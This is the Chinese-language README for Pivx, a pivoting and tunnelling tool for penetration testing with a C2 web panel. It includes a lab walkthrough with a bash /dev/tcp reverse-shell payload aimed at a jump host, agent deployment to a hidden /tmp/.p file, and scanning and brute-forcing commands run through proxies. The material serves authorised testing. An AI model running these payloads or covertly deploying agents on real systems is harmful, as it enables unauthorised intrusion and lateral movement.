# Pivx 🕸️

![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)
![DuckDB](https://img.shields.io/badge/DuckDB-1.0+-FFF000?logo=duckdb&logoColor=black)
![Streamlit](https://img.shields.io/badge/Streamlit-1.36+-FF4B4B?logo=streamlit&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL2-lightgrey)
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](../LICENSE)

[English](../README.md) | [Español](README_es.md) | [Português](README_pt.md) | [中文](README_zh.md)

**用于授权渗透测试的网络跳板与路由工具。**
Pivx 采用**混合帧（Hybrid Framing）**架构，在单条 WebSocket 连接上复用 **L3 隧道、L4 端口转发和 L7 SOCKS5**，实现**超低延迟** —— 无额外帧头开销，无需建立辅助连接。

> **当前状态（Phase 3）：**完整的跳板套件，适用于 CTF 和渗透测试。
> 完整设计详见 [`ARCHITECTURE.md`](../ARCHITECTURE.md)。

---

## ⚡ 核心特性

- **L3 隧道** —— TUN 接口 `pivx0`，Agent 端采用用户态 TCP/IP 协议栈（gVisor netstack）。完整的 IP 路由通过隧道传输。
- **L4 端口转发** —— 本地转发（`-L`）和远程转发（`-R`）在同一 WebSocket 上复用。非常适合反弹 Shell。
- **L7 SOCKS5 代理** —— 动态代理，由 Agent 端完成 DNS 解析。兼容 proxychains、ffuf、Burp Suite 及所有支持 SOCKS 的工具。
- **高保真扫描** —— ICMP Smartping、Magic IP、SYN-Cookie 抑制和智能 RST，确保通过隧道获得准确的 nmap 扫描结果。
- **混合帧（Hybrid Framing）** —— 控制帧（JSON 文本帧）+ 数据帧（二进制帧）共用一条 WebSocket。L3 数据包（IP 标识 `0x4`/`0x6`）和 MUX 流（`0x01`）在二进制帧中以零开销方式共存。
- **Kill Switch** —— 在 C2 面板中一键远程终止 Agent。
- **加固数据面** —— MTU 1350（为 WebSocket/TLS 预留空间）、背压丢弃机制、防上行路由保护。
- **Web 控制面板** —— 基于 Streamlit 的 C2 面板，提供实时 Agent 状态、隧道控制、路由管理和端口转发界面。

---

## 🎯 高保真与规避能力

Pivx 实现了网络保真度优化，使通过隧道的扫描与原生连接无法区分。所有功能均在自动化 Docker 实验环境中完成验证。

### ICMP Smartping

与典型的跳板工具不同，Pivx 支持**通过 L3 隧道进行真实 ping**。Agent 拦截 ICMP Echo Request，在操作系统层面执行真实的 `ping` 以验证主机存活，然后构造带有正确 RFC 1071 校验和的 Echo Reply 返回。

```bash
# 在 C2 端，隧道和路由已激活的情况下：
ping -c 2 10.10.20.100

PING 10.10.20.100 (10.10.20.100) 56(84) bytes of data.
64 bytes from 10.10.20.100: icmp_seq=1 ttl=64 time=5.03 ms
64 bytes from 10.10.20.100: icmp_seq=2 ttl=64 time=2.88 ms

--- 10.10.20.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

这使得 nmap 可以**无需 `-Pn` 即可完成主机发现** —— 响应 ping 的主机会被标记为*存活*，nmap 仅扫描这些主机。

### Magic IP（`240.0.0.1`）

保留的 E 类地址段 `240.0.0.0/4` 会在 Agent 端被重写为 `127.0.0.1`，这在 L3 隧道和 SOCKS5/MUX 两条路径上均有效。可以在不产生 IP 冲突的情况下访问仅监听在受害主机 localhost 上的服务（数据库、管理面板、内部 API）：

```bash
# 通过 SOCKS5 —— 访问 Agent localhost:8080 上隐藏的 HTTP 服务：
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/

# 返回结果：Agent 文件系统的目录列表
<!DOCTYPE HTML>
<html lang="en">
<head><title>Directory listing for /</title></head>
...
```

`240.x.x.x` 段中的任意 IP 均可使用：`240.0.0.1`、`240.1.2.3` 等。所有地址均重定向到 Agent 的 `127.0.0.1`。

### SYN-Cookie 抑制

Pivx 禁用了 gVisor 的 SYN-Cookie 机制，防止 netstack 在不创建状态的情况下对**每个** SYN 都回复 SYN-ACK。如果不进行此修复，`nmap -sS` 会将所有端口显示为*开放*。修复后，仅真正开放的端口才会响应。

### 智能 RST

当 Agent 拨号到已关闭的端口并收到 `ECONNREFUSED` 时，会向扫描器返回 RST。如果目标无响应（超时），则保持静默。这使 nmap 能够正确区分*关闭*（RST）和*被过滤*（无响应）端口。

### Kill Switch

在 C2 面板中，一键发送 `{"type":"kill"}` 到 Agent，Agent 立即执行 `os.Exit(0)`。WebSocket 关闭，面板即时反映状态变化。

### 已验证的测试结果

| 测试项 | 结果 | 详情 |
|------|--------|--------|
| Smartping L3（通过隧道 ping） | **通过** | 2/2 回复，约 4ms RTT |
| Magic IP L7（240.0.0.1:8080 经 SOCKS5） | **通过** | HTTP 200，目录列表 |
| Kill Switch（远程 os.Exit） | **通过** | 断开连接 < 1s |

---

## 📋 环境要求

- **服务端：**Linux 或 **WSL2**（TUN 需要 `/dev/net/tun`）。需要 **root** 权限（或 `CAP_NET_ADMIN`）来创建接口和添加路由。
- **Agent 端：**无需安装 Go —— 从 [Releases](https://github.com/HangLoose84/Pivx/releases) 下载预编译二进制文件即可。仅在从源码构建时需要 Go 1.22+。

---

## 🚀 快速开始

### 1) 服务端（Python，Linux/WSL2）

> **Kali Linux 及新版发行版注意事项：**Python 3.11+ 将系统包标记为 `externally-managed-environment`，会阻止全局 `pip install`。Pivx 使用**虚拟环境（`venv`）**来避免此问题。`install.sh` 脚本会自动创建虚拟环境。

**快速安装（不到 2 分钟）：**

```bash
git clone https://github.com/HangLoose84/Pivx.git
cd Pivx
chmod +x install.sh
./install.sh
```

**启动 C2：**

```bash
sudo server/venv/bin/streamlit run server/app.py
```

需要 `sudo` 权限，因为服务端需要创建 TUN 接口并操作内核路由表。直接调用 venv 中的 `streamlit` 可避免使用 `sudo -E` 或手动激活 venv。

WebSocket 监听地址：`ws://0.0.0.0:8765` —— 控制面板界面：http://localhost:8501

### 2) Agent

> **如果仅需使用 Pivx，无需安装 Go 或进行编译。**从 [**Releases**](https://github.com/HangLoose84/Pivx/releases) 页面下载预编译二进制文件并上传到目标机器：
>
> ```bash
> # 在目标机器上：
> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
> chmod +x /tmp/.p
> /tmp/.p --server ws://YOUR_C2:8765
> ```
>
> 可用二进制文件：`pivx-agent-linux-amd64`、`pivx-agent-linux-arm64`、`pivx-agent-windows-amd64.exe`。

#### 从源码构建（高级）

需要 **Go 1.22+**。首次构建 —— 获取 gVisor（特殊 `go` 分支）并解析依赖：

```bash
cd agent
go get gvisor.dev/gvisor@go
go mod tidy
```

直接运行：

```bash
go run . --server ws://127.0.0.1:8765
```

#### 使用 `Makefile` 交叉编译（推荐）

根目录的 `Makefile` 可交叉编译静态、裁剪后的二进制文件（`-ldflags="-s -w"` + `-trimpath`，无符号表和 DWARF 信息），最大限度减小体积 —— 这在 CTF 中通过不稳定连接上传 Agent 时至关重要。

```bash
make deps           # 首次执行：获取 gVisor（go 分支）并整理模块
make                # 构建全部 3 个平台到 ./dist
```

单独的构建目标：

```bash
make linux-amd64     # -> dist/pivx-agent-linux-amd64
make linux-arm64     # -> dist/pivx-agent-linux-arm64
make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
make clean           # 清除 ./dist
```

二进制文件使用 `CGO_ENABLED=0`（完全静态，目标机器无需 libc 依赖）。部署示例：

```bash
scp dist/pivx-agent-linux-amd64 target:/tmp/.p
ssh target '/tmp/.p --server ws://YOUR_C2:8765'
```

### 3) 激活隧道和路由

1. 在控制面板的**隧道（Tunnel）**部分，选择 Agent 并点击 **Start tunnel**（创建 `pivx0`）。
2. 在**路由（Routes）**部分，添加内部子网：点击 Agent 已**发现的子网**，或手动输入（`10.10.20.0/24`）。
3. 此时本地工具即可通过 Agent 访问内部网络：

```bash
nmap -sS 10.10.20.0/24          # SYN 扫描可用（智能 RST + 无 SYN-Cookie）
ping 10.10.20.5                  # 可用（Smartping）
curl http://10.10.20.5/
```

### 4) 验证

- Agent 显示为**在线**，包含主机名/操作系统/架构及其子网信息。
- 在服务端执行 `ip addr` 可看到 `pivx0`；`ip route` 显示子网路由到 `pivx0`。
- 到内部局域网的流量正常工作；Agent 日志中出现 `[tcp] proxy established -> ...` 记录。

### 5) 端口转发（L4）和 SOCKS5（L7）

除 L3 隧道外，Pivx 还在同一 WebSocket 上复用 **TCP 流**。这些功能**不需要 L3 隧道** —— 仅需一个已连接的 Agent。在控制面板的**端口转发（L4）**部分进行操作。

#### 本地转发（`-L`）—— 将内部服务暴露到本地

选择**本地（-L）**选项卡。服务端在本地打开一个端口；Agent 拨号到内部网络的 `IP:port`。

```bash
# 绑定：127.0.0.1:8080 → 目标（Agent 端）：10.10.20.5:80
curl http://127.0.0.1:8080/     # 通过 Agent 访问内部网络的 :80 端口
```

适用于访问管理面板、数据库（`:3306`）、RDP 等。

#### 远程转发（`-R`）—— 接收反弹 Shell

选择**远程（-R）**选项卡。**Agent** 在受害者网络上打开一个端口；传入连接被转发到本地处理器。

```bash
# 在受害者端绑定：0.0.0.0:4444 → 本地目标：127.0.0.1:5555
# 在 C2 上：
nc -lvnp 5555
# 在受害者端：连接到 agent_ip:4444 → 到达你的 127.0.0.1:5555
```

#### SOCKS5（L7）—— Web 工具的动态代理

进入 **SOCKS5 代理**部分。点击 **Start SOCKS5**（默认 `127.0.0.1:1080`）。**DNS 解析和 TCP 连接均在 Agent 端完成**，因此内部主机名会在受害者网络上解析。

```bash
# proxychains（配置 /etc/proxychains4.conf → socks5 127.0.0.1 1080）：
proxychains -q curl http://intranet.victim.local/
proxychains -q smbclient -L //10.10.20.5/

# 直接 SOCKS 支持：
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/

# Burp Suite：Settings → Network → SOCKS proxy → 127.0.0.1:1080
#   （勾选 "Do DNS lookups over SOCKS proxy"）
```

---

## 🔀 场景：通过双跳进入隔离网络

使用 Docker 测试的真实场景：通过一台横跨两个网络的跳板机，入侵一台**无互联网访问**的机器。

### 网络拓扑

```
  你的机器 (Kali)              公共网络                 内部网络（隔离）
  ┌─────────────┐          ┌─────────────┐          ┌──────────────────┐
  │  Pivx C2    │◄── WS ──►│  跳板机      │          │  目标主机         │
  │  10.10.10.10│          │  10.10.10.20 │──────────│  10.10.20.100    │
  │             │          │  10.10.20.20 │          │  （无互联网）      │
  └─────────────┘          └─────────────┘          └──────────────────┘
    SOCKS5 :1080             Pivx Agent               HTTP :80
    Handler :9001            rforward :4444
```

C2 **无法直接访问** `10.10.20.0/24`。Pivx 解决了这个问题。

### 步骤 1 —— 在跳板机上部署 Agent

```bash
scp dist/pivx-agent-linux-amd64 user@10.10.10.20:/tmp/.p
chmod +x /tmp/.p
/tmp/.p --server ws://10.10.10.10:8765
```

Agent 连接后上报其网络接口，并发现子网 `10.10.20.0/24`。控制面板显示其状态为**在线**。

### 步骤 2 —— 通过 SOCKS5 访问隔离网络（入站）

在控制面板中启动 SOCKS5（`127.0.0.1:1080`）：

```bash
# 扫描隔离目标：
proxychains -q nmap -sT -Pn -p 22,80,443,445 10.10.20.100

# 浏览内部 Web 服务：
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/

# 目录爆破：
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

流量路径：`你的工具 → SOCKS5 :1080 → MUX → 跳板机 → 10.10.20.100`。

### 步骤 3 —— 通过远程转发接收反弹 Shell（出站）

隔离目标无法连接到你的 C2，但可以访问跳板机。使用**远程转发**来中继连接：

```bash
# 1) 控制面板：端口转发 → 远程（-R）
#    受害者端绑定：0.0.0.0:4444 → 本地目标：127.0.0.1:9001

# 2) 启动处理器：
nc -lvnp 9001

# 3) 在目标上执行 payload，指向跳板机：
bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
```

流量路径：`目标 → 跳板机:4444 → MUX → C2:9001`。

### 已验证的测试结果

使用自动化 Docker 实验环境测试（3 个容器，2 个隔离网络）：

| 测试项 | 结果 | 延迟 |
|------|--------|---------|
| SOCKS5 入站 → target:80 | HTTP 200 完整响应 | 约 25ms |
| 远程转发 ← 反弹 Shell | C2:9001 收到 Payload | 约 13s（脚本等待） |
| 关闭后残留流 | 0（无泄漏） | — |

---

## 🗂️ 项目结构

```
Pivx/
├── Makefile                  # 交叉编译（linux/amd64、arm64、win/amd64）
├── agent/                    # Go Agent
│   ├── go.mod
│   ├── main.go               # WS 传输 + 控制 + 发现（防上行）
│   ├── netstack.go           # gVisor 协议栈（用户态）+ TCP/UDP 转发器（L3）
│   ├── icmp.go               # ICMP Smartping + UDP 端口不可达注入
│   └── mux.go                # TCP 流复用（L4/L7）共用同一 WS
├── server/
│   ├── app.py                # Streamlit 控制面板（隧道 + 路由 + 转发 + SOCKS）
│   ├── requirements.txt
│   └── pivx_server/
│       ├── db.py             # DuckDB 持久化（Agent、路由、日志）
│       ├── tun.py            # Linux TUN 接口（raw-IP，MTU 1350）
│       ├── runtime.py        # TUN <-> WebSocket 编排（L3 面）
│       ├── forward.py        # MUX 层：L4 端口转发 + SOCKS5（L4/L7）
│       └── ws_server.py      # WebSocket 监听器（控制 + 数据 + L3/MUX 分流）
├── ARCHITECTURE.md
└── README.md
```

---

## ⚠️ 已知限制

### 扫描技巧

Pivx 支持**通过隧道进行 ping 探测**（Smartping）和 **SYN 扫描**（SYN-Cookie 抑制 + 智能 RST）。支持的 nmap 模式：

```bash
nmap -sn 10.10.20.0/24          # 使用 ping 进行主机发现（Smartping）
nmap -sS 10.10.20.0/24          # SYN 扫描（准确的开放/关闭/被过滤状态）
nmap -sT 10.10.20.0/24          # TCP 全连接扫描（始终可用）
```

> **注意：**Smartping 对每个 Echo Request 执行一次真实的操作系统级 `ping`，会增加约 3-5ms 延迟。对于大规模扫描，`-Pn` 仍然更快，因为它跳过了发现阶段。

### 当前限制

- **同一时间仅支持单个隧道/单个活跃 Agent**（面向 CTF 场景）。同时多 Agent 功能已**推迟**到 Phase 5。
- **尚无 TLS/wss 或 Agent 认证**（Phase 4）。请勿在实验环境或受控网络之外使用。
- **SOCKS5** 仅实现了基于 TCP 的 `CONNECT`（不支持 BIND 或 UDP ASSOCIATE），对于扫描/爆破/Web 代理已足够。
- Agent 在未正常关闭的情况下断开连接后，会在约 45 秒无 ping 后**自动标记为 `offline`**（服务端 keep-alive 扫描机制）。

### 备注（gVisor / 环境）

- **gVisor** 的 API 对版本敏感；本代码跟踪 `go` 分支。如果 `go mod tidy` 出现符号不匹配，请根据解析到的版本调整 `netstack.go` 中的名称。
- 未在 Windows 作为服务端的环境下测试（已选择 Linux/WSL2 以获得 TUN 支持）。

---

> ⚠️ **仅限在你拥有或获得明确书面授权的系统上使用。**

---

## 📄 许可证

本项目基于 **GNU 通用公共许可证 v3.0** 发布。完整许可证文本请参阅 [LICENSE](../LICENSE) 文件。
